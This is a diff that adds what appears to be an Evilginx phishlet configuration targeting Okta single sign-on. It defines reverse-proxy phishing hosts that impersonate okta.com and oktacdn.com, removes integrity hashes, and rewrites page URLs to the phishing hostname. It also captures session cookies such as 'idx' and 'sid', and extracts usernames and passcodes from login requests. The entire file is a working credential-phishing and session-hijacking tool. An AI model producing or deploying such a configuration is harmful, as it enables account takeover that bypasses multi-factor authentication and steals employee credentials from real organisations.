@@ -1,0 +1,29 @@
+author: 'alfiegriver, hydroponictrash'
+min_ver: '3.0.0'
+redirect_url: 'https://okta.com' # default redirect_url to prevent the infinite reload loop
+params:
+  - {name: 'subdomain', default: '', required: true}
+  - {name: 'cdnsubdomain', default: '', required: true}
+proxy_hosts:
+  - {phish_sub: '{subdomain}-okta', orig_sub: '{subdomain}', domain: 'okta.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: '{cdnsubdomain}', domain: 'oktacdn.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: false, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: '{subdomain}.okta.com', orig_sub: '', domain: '{subdomain}.okta.com', search: 'sha384-.{64}', replace: '', mimes: ['text/html']}
+  - {triggers_on: '{subdomain}.okta.com', orig_sub: '{subdomain}', domain: 'okta.com', search: '/https.*\.{subdomain}\.okta\.com/', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript', 'application/ion+json', 'application/javascript']}
+  - {triggers_on: '{subdomain}.okta.com', orig_sub: '{subdomain}', domain: 'okta.com', search: '{subdomain}.okta.com', replace: '{hostname}', mimes: ['application/ion+json']}
+auth_tokens:
+  - domain: '{subdomain}.okta.com'
+    keys: ['idx','sid,opt'] # 'idx' if using OIE and factor sequencing, 'sid' if not (default). using opt here means 'optional'. if its there, catch it.
+credentials:
+  username:
+    key: ''
+    search: '"identifier":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"passcode":"([^"]*)'
+    type: 'json'
+login:
+  domain: '{subdomain}.okta.com'
+  path: '/login/login.htm'
